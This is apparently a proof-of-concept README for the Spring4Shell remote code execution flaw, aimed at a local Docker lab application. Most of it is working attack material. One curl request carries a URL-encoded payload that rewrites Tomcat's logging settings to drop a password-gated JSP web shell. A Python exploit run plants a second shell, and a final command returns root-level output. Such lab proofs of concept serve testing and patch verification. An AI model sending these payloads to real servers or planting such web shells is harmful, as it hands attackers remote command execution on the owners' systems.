# POC

## Getting started

```bash
$ mvn clean install
```

```bash
$ docker build . -t spring4shell && docker run -p 8080:8080 --name spring4shell --rm spring4shell
```

### curl

- [source](https://github.com/jbaines-r7/spring4shell_vulnapp)

```bash
$ curl -v -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://localhost:8080/helloworld/greeting
```

```bash
# application log
04-Apr-2022 01:42:55.154 INFO [Catalina-utility-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
04-Apr-2022 01:42:55.172 INFO [Catalina-utility-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [19] ms
```

```bash
$ curl http://localhost:8080/tomcatwar.jsp
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))3D-1){ out.println(new String(b)); } } -
```

```bash
$ docker exec -it spring4shell cat /usr/local/tomcat/webapps/ROOT/tomcatwar.jsp
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))3D-1){ out.println(new String(b)); } } -
```

### python

```bash
$ pip3 install requests

$ python3 exploit.py --url "http://localhost:8080/helloworld/greeting"
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://localhost:8080/shell.jsp?cmd=id
```

```bash
$ curl http://localhost:8080/shell.jsp\?cmd\=id --output -
# or browser
uid=0(root) gid=0(root) groups=0(root)
```

